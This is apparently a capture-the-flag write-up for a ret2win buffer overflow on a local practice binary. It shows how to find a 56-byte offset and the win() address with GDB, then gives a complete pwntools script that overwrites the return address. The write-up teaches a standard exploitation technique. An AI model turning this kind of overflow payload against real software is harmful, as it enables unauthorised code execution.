## Overview
This is a simple **ret2win** buffer overflow exploit. By analyzing the source code, we can determine that the program contains a vulnerable function that allows us to overwrite the return address and redirect execution to the `win()` function.

## Steps to Exploit
1. **Find the Buffer Offset**
   - Use GDB (`gdb -q ./vuln`) and `pattern_create` from `pwntools` to determine the exact offset where the return address is overwritten.
   - In this case, the offset is **56 bytes**.

2. **Find the Memory Address of the `win()` Function**
   - Use GDB to disassemble the binary (`disas win`) and note down the function address.
   - The address is **0x401186**.

3. **Craft the Exploit Payload**
   - Fill the buffer with 56 'A' characters.
   - Overwrite the return address with the address of `win()`.

## Exploit Code
```python
from pwn import *

context(arch='amd64', os='linux')
binary = './vuln'

# Addresses
win_addr = 0x401186
offset = 56 

payload = b'A' * offset + p64(win_addr)

# Start process with timeout
p = process(binary, timeout=2)

# Method 1: Automatic prompt handling
# p.sendlineafter(b':', payload)  # If exact match exists

# Method 2: Manual interaction
p.recvuntil(b'Enter input:')  # Match whatever your binary outputs
p.sendline(payload)

# Get output
print(p.clean().decode())
p.close()
```


